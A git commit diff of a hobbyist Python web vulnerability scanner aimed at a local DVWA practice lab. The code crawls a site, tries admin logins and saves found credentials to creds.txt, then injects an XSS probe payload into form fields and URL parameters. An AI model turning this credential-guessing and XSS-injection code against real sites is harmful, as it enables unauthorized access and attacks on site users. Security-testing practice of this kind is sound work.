485d2fbc35161ae1bc733f9f5208c48881f53e5f
benQEMUKali <benro2211@gmail.com>
2022-05-12 00:42:51 -0600

    got vuln scanner working with a staged payload, need to fix mutill bug where directory is found but can still send data

--- spider.py
+++ spider.py
@@ -21,13 +21,12 @@ class fc:
 class Spider:
 	def __init__(self,url,ignore=None): #ignore is an array of links to ignore, (logout.php)
 		self.storeLinks = []
-		self.ua = UserAgent()
 		self.url = url
 		self.session = requests.Session()
 		self.ignore = ignore
+		self.ua = UserAgent()
 		print(f'{fc.pu}#{fc.end}'*100)
 		print(f'{fc.cy}Spider session created:{fc.end} {fc.wg}{self.session}{fc.end}')
-		self.fuckedList = []
 		
 	def parseLinks(self,get): #using regex to parse href links not bs yet, returns a list 
 		if isinstance(get,bytes):
@@ -146,130 +145,3 @@ class Spider:
 			self.crawlerReq(self.url)
 		elif runType == 'get':
 			self.crawlerBase(self.url)
-
-	def getForms(self,url):
-		response = self.session.get(url,headers = {'User=Agent': self.ua.random})
-		if b'</form>' in response.content: # simple check to see if there is a form tag
-			soup = BeautifulSoup(response.content,'html.parser')
-			forms = soup.findAll('form') # returns list of forms found by bs 
-			return forms
-		else:
-			return None
-		
-	def postForm(self,forms,value,url): # can pass a list in for forms but should only be 1 item
-		#try:
-		print('postForm\n')
-		for form in forms:
-			inputList = form.findAll('input')
-			postData = {}
-			action = form.get('action')
-			fullurl = (urljoin(url, action))
-			method = form.get('method')
-			# print(
-			# f'\n{fc.p}Link: {fullurl}{fc.end}\n'
-			# f'{fc.p}Action: {action}{fc.end}\n'
-			# f'{fc.p}Method: {method}{fc.end}\n'
-			# f'{fc.p}Inputs: {inputList}{fc.end}\n'
-			# )
-			if inputList:
-				for i in inputList:
-					inputName = i.get('name')
-					inputType = i.get('type')
-					inputValue = i.get('value')
-					if inputType == 'text':
-						inputValue = value
-					postData[inputName] = inputValue
-					#print(f'Post Data: {postData}')
-					if method == 'post':
-						print('Sending Post')
-						return self.session.post(fullurl,data=postData)
-					print('Sending get')
-					return self.session.get(fullurl,params=postData)
-			else:
-				print(f'{fc.r}No inputs found on {fullurl}{fc.end}')
-				return None
-	    
-	def runScan(self,lst): # takes a list from another instance just like the login
-		for link in lst:
-			forms = self.getForms(link)
-			if forms:
-				print(f'{fc.pu}-{fc.end}'*50)
-				print(f'\n{fc.pv}[+]{fc.end} Discovering vulnerability for {fc.cy}{link}{fc.end}')
-				is_vulnerable = self.testXSS(link,forms)
-				if is_vulnerable:
-					print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}\nForm:\n\n{fc.pu}{forms}{fc.end}\n\n')
-			# if '=' in link:
-			# 	print(f'{fc.pv}[+]{fc.end} Testing {fc.cy}{link}{fc.end}')
-			# 	is_vulnerable = self.testXSS(link)
-			# 	if is_vulnerable: 
-			# 		print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{url}{fc.end}\nForm:\n\n{fc.pu}{form}{fc.end}\n\n')
-			else:
-				print(f'{fc.pu}-{fc.end}'*50)
-				print(f'{fc.r}No forms in {link}{fc.end}')
-	
-	def bruteRun(self):
-		testScript = '<sCript>alert("test")</scriPt>'
-		for link in self.fuckedList:
-			forms = self.getForms(link)
-			response = self.postForm(forms,testScript,link)
-			print(testScript in response.text,'\n',link)
-			print(response.text)
-	
-	def testXSS(self,url,forms=None): #forms can be list
-		#print('testXSS\n\n')
-		# print(
-		# 	f'{fc.rw}TROUBLESHOOT{fc.end}\n'
-		# 	f'URL {url}\n'
-		# 	f'Form: {fc.cy}{forms}{fc.end}'
-		# )
-		testScript = '<sCript>alert("test")</scriPt>'
-		#print(type(forms)) # bs4 match class not list but can be treated like a list list[0]
-		if forms: # makes sure that list is not empty
-			#print(type(forms))
-			#for form in forms:
-				#print(form.findAll('input'))
-			response = self.postForm(forms,testScript,url) # postForm can take a list and parse the bs4 object	
-			if response:
-				if 'Hacking attempt' in str(response.content):
-					print('pwned')
-					self.fuckedList.append(url)
-				else:
-					if testScript in str(response.content):
-						print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
-						return True
-			else:
-				print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}\n')
-				return False
-
-		else: # this will run when no form is passed into function, create link with link/?input=input
-			# print(self.getForms(url))
-			#print(type(self.getForms(url)))
-			if not url.endswith('/'):
-				url = url + '/'
-			forms = self.getForms(url)
-			if forms:
-				if len(forms) == 1:
-					form = forms[0]
-					inputs = form.findAll('input')
-					for i in inputs:
-						name = (i.get('name'))
-						if name: # should not get the input for the submit button == None
-							#print(url)
-							testUrl = url + f'?{name}={testScript}'
-							print(f'Sending URL: {fc.g}{testUrl}{fc.end}')
-							response = self.session.get(testUrl)
-							print(f'Status code: {response.status_code}')
-							if testScript in str(response.content):
-								print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
-								return True
-							else:
-								print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
-								return False
-			else:
-				print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
-				return False
-
-
-
-
-########################################################RUN###################################################################
--- vulnScan.py
+++ vulnScan.py
@@ -1,7 +1,9 @@
 from spider import Spider
 from bs4 import BeautifulSoup
-import argparse, requests, json, re
 from urllib.parse import urljoin
+from fake_useragent import UserAgent
+#######################################
+import argparse, requests, json, re
 
 class fc:
     rw = '\033[31;107m'
@@ -27,21 +29,28 @@ class Vulnscan:
 	def __init__(self,url): 
 		self.spider = Spider(url,['http://192.168.86.115/dvwa/logout.php'])
 		self.url = url
+		self.formLinks = []
+		self.ua = UserAgent()
 		
 	def runSpider(self): # run spider will test the site and return list of what it can access
 		self.spider.run()
 		if len(self.spider.storeLinks) > 0:
 			# for link in self.spider.storeLinks:
 			# 	print(f'{fc.b}{link}{fc.end})
+			with open('links.txt','w') as writeFile:
+				for link in self.spider.storeLinks:
+					writeFile.write(link)
+					writeFile.write('\n')
 			return self.spider.storeLinks
 		else:
 			print('List is empty, check link and try again')
 
 	def testCreds(self,lst):
+		print(f'{fc.y}Starting password search...{fc.end}')
 		for link in lst:
 			response = self.spider.reqGet(link)
 			if b'action=' in response and b'login.php' in response:
-				forms = self.spider.getForms(link)
+				forms = self.getForms(link)
 				if len(forms) == 1:
 					action = forms[0].get('action')
 					if 'login' in action:
@@ -64,12 +73,10 @@ class Vulnscan:
 								postData[i.get('name')] = i.get('type')
 						creds = self.returnCreds(fullurl,postData,'admin')
 						if creds:
-							print(
-							f'{fc.pv}[+]{fc.end} {fc.g}Credentials found for {fc.y}{fullurl}{fc.end}'
-							)
+							print(f'{fc.pv}[+]{fc.end} {fc.g}Credentials found for {fc.y}{fullurl}{fc.end}\nWriting to {fc.b}\'creds.txt\'{fc.end}')
 							with open('creds.txt','w') as writeCred:
 								writeCred.write(fullurl)
-								writeCred.write(',')
+								writeCred.write('\n')
 								writeCred.write(json.dumps(creds))
 								writeCred.write('\n')
 							#return[fullurl,creds] # write to a file instead of returning, could exit loop early 
@@ -86,7 +93,8 @@ class Vulnscan:
 						#print(type(data))
 		except FileNotFoundError:
 			print(f'{fc.r}Creds file not found, run testCreds on target{fc.end}')
-		print('\n',f'{fc.pu}={fc.end}'*50)
+		print('\n')
+		print(f'{fc.pu}={fc.end}'*50)
 		print(f'Login session: {fc.wg}{self.spider.session}{fc.end}')
 		print(
 		f'{fc.y}Logging in{fc.end}\n'
@@ -117,83 +125,166 @@ class Vulnscan:
 		for link in lst:
 			print(f'{fc.b}{link}{fc.end}')
 
+	def testXSS(self,url,forms=None): #forms can be list
+		testScript = '<sCript>alert("test")</scriPt>'
+		if forms: # makes sure that list is not empty
+			response = self.postForm(forms,testScript,url) # postForm can take a list and parse the bs4 object	
+			if response:
+				print(f'{fc.r}{response.status_code}{fc.end}')
+				if testScript in str(response.content):
+					print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
+					return True
+				else:
+					print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}\n')
+					return False
+		else: # this will run when no form is passed into function, create link with link/?input=input
+			if not url.endswith('/'):
+				url = url + '/'
+			forms = self.getForms(url)
+			if forms:
+				if len(forms) == 1:
+					form = forms[0]
+					inputs = form.findAll('input')
+					for i in inputs:
+						name = (i.get('name'))
+						if name: # should not get the input for the submit button == None
+							#print(url)
+							testUrl = url + f'?{name}={testScript}'
+							print(f'Sending URL: {fc.g}{testUrl}{fc.end}')
+							response = self.spider.session.get(testUrl)
+							print(f'Status code: {response.status_code}')
+							if testScript in str(response.content):
+								print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
+								return True
+							else:
+								print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
+								return False
+			else:
+				print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
+				return False
+
+	def postForm(self,forms,value,url): # can pass a list in for forms but should only be 1 item
+		for form in forms:
+			inputList = form.findAll('input')
+			postData = {}
+			action = form.get('action')
+			fullurl = (urljoin(url, action))
+			method = form.get('method')
+			print(
+			f'\n{fc.p}Link: {fullurl}{fc.end}\n'
+			f'{fc.p}Action: {action}{fc.end}\n'
+			f'{fc.p}Method: {method}{fc.end}\n'
+			f'{fc.p}Inputs: {inputList}{fc.end}\n'
+			)
+			if inputList:
+				for i in inputList:
+					inputName = i.get('name')
+					inputType = i.get('type')
+					inputValue = i.get('value')
+					if inputType == 'text':
+						inputValue = value
+					postData[inputName] = inputValue
+					#print(f'Post Data: {postData}')
+				if method == 'post':
+					print(f'Sending Post: {postData}')
+					return self.spider.session.post(fullurl,data=postData)
+				print(f'Sending Get: {postData}')
+				return self.spider.session.get(fullurl,params=postData)
+			else:
+				print(f'{fc.r}No inputs found on {fullurl}{fc.end}')
+				return None
+	
+	def runScan(self,lst=None): # takes an optional list from another instance just like the login, otherwise opens a file and reads links
+		if lst:	
+			print(f'{fc.y}Performing scan on{fc.end} {fc.pu}{len(lst)}{fc.end} {fc.y}links...{fc.end}')
+			for link in lst:
+				forms = self.getForms(link)
+				if forms:
+					print(f'{fc.pu}-{fc.end}'*50)
+					print(f'\n{fc.wg}[+]{fc.end} Discovering vulnerability for {fc.cy}{link}{fc.end}')
+					is_vulnerable = self.testXSS(link,forms)
+					if is_vulnerable:
+						#print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}\nForm:\n\n{fc.pu}{forms}{fc.end}\n\n')
+						print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}')
+						print(f'{fc.p}Performing URL crosscheck{fc.end}')
+						print(self.testXSS(link))
+
+				elif '=' in link:
+					print(f'{fc.pv}[+]{fc.end} Testing {fc.cy}{link}{fc.end}')
+					is_vulnerable = self.testXSS(link)
+					if is_vulnerable: 
+						print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{url}{fc.end}\nForm:\n\n{fc.pu}{form}{fc.end}\n\n')
+				else:
+					print(f'{fc.pu}-{fc.end}'*50)
+					print(f'{fc.r}No forms in {link}{fc.end}')
+		else:
+			try:
+				with open('links.txt') as readLinks:
+					for link in readLinks:
+						link = link.strip()
+						forms = self.getForms(link)
+						if forms:
+							print(f'{fc.pu}-{fc.end}'*50)
+							print(f'\n{fc.pv}[+]{fc.end} Discovering vulnerability for {fc.cy}{link}{fc.end}')
+							is_vulnerable = self.testXSS(link,forms)
+							if is_vulnerable:
+								print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}\nForm:\n\n{fc.pu}{forms}{fc.end}\n\n')
+						elif '=' in link:
+							print(f'{fc.pv}[+]{fc.end} Testing {fc.cy}{link}{fc.end}')
+							is_vulnerable = self.testXSS(link)
+							if is_vulnerable: 
+								print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{url}{fc.end}\nForm:\n\n{fc.pu}{form}{fc.end}\n\n')
+						else:
+							print(f'{fc.pu}-{fc.end}'*50)
+							print(f'{fc.r}No forms in {link}{fc.end}')
+
+			except FileNotFoundError:
+				print(f'{fc.r}No links file! Try passing in list to check for vulnerability{fc.end}')
+		
+	def getForms(self,url):
+		response = self.spider.session.get(url,headers = {'User=Agent': self.ua.random})
+		if b'</form>' in response.content: # simple check to see if there is a form tag
+			soup = BeautifulSoup(response.content,'html.parser')
+			forms = soup.findAll('form') # returns list of forms found by bs 
+			return forms
+		else:
+			return None
+		
 	def checkForms(self,lst): #pass in a list to check each link for forms
 		for link in lst:
 			#print(f'{fc.g}{link}{fc.end}')
-			forms = self.spider.getForms(link)
-			if forms:
-				print(f'{fc.r}{link}{fc.end}\n{fc.b}{forms}{fc.end}')
-
-	
+			forms = self.getForms(link)
+			if forms and link not in self.formLinks:
+				self.formLinks.append(link)
+				#print(f'{fc.r}{link}{fc.end}\n{fc.b}{forms}{fc.end}')
+		return self.formLinks
 
 #########################################################RUN#######################################################
 
-args = Args()
-# v1 = Vulnscan(args.url)
-# v1.runSpider()
-# #v1.checkForms(v1.spider.storeLinks)
-# sesList = v1.testCreds(v1.spider.storeLinks)
+def runALL():
+	print(f'{fc.pu}#{fc.end}'*100)
+	print(f'{fc.y}Starting Stage 1 -- Initial scan{fc.end}')
+	global args
+	args = Args()
+	v1 = Vulnscan(args.url)
+	v1.runSpider()
+	print(f'{fc.g}Initial crawler returned{fc.end} {fc.cy}{len(v1.spider.storeLinks)}{fc.end} {fc.g}links{fc.end}')
+	print(f'{fc.cy}{len(v1.checkForms(v1.spider.storeLinks))}{fc.end} {fc.g}links have forms{fc.end}')
+	v1.testCreds(v1.formLinks)
+	print(f'{fc.pu}#{fc.end}'*100)
+	print(f'{fc.y}Starting Stage 2 -- Session scan{fc.end}')
+	v2 = Vulnscan(args.url)
+	v2.login()
+	v2.runSpider()
+	formsList = v2.checkForms(v2.spider.storeLinks)
+	print(f'{fc.g}Session crawler returned{fc.end} {fc.cy}{len(v2.spider.storeLinks)}{fc.end} {fc.g}links{fc.end}')
+	print(f'{fc.cy}{len(formsList)}{fc.end} {fc.g}links have forms{fc.end}')
+	print(f'{fc.y}Sending forms to Stage 3{fc.end}')
+	print(f'{fc.pu}#{fc.end}'*100)
+	print(f'{fc.y}Starting Stage 3 -- Vulnerability scan{fc.end}')
+	v3 = Vulnscan(args.url)
+	v3.login()
+	v3.runScan(v2.checkForms(v2.spider.storeLinks))
 
-v2 = Vulnscan(args.url) # cant login with instance 1 and rerun the spider so start a new instance and login first using creds gathered from instance 1 
-v2.login()
-print(v2.runSpider())
-#print(v2.spider.reqGet('http://192.168.86.115/dvwa/vulnerabilities/xss_r'))
-
-# forms = v2.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r')
-# print(forms)
-# testScript = '<sCript>alert("test")</scriPt>'
-# response = (v2.spider.postForm(forms,testScript,'http://192.168.86.115/dvwa/vulnerabilities/xss_r'))
-# print(testScript in str(response.content))
-# THIS WORKS
-
-
-
-#v2.checkForms(v2.spider.storeLinks)
-
-
-# forms = v2.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')
-# print(v2.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/',forms))
-# print(v2.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/'))
-# #THIS WORKS
-
-# (v2.runSpider())
-# (v2.spider.runScan())
-
-v3 = Vulnscan(args.url)
-v3.login()
-v3.spider.runScan(v2.spider.storeLinks)
-# for link in v2.spider.fuckedList:
-# 	print(link)
-# 	# forms = v3.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')
-# 	# print(v3.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/',forms))
-# 	forms = v3.spider.getForms(link)
-# 	print(v3.spider.testXSS(link,forms))
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+runALL()
+v4 = Vulnscan(args.url)
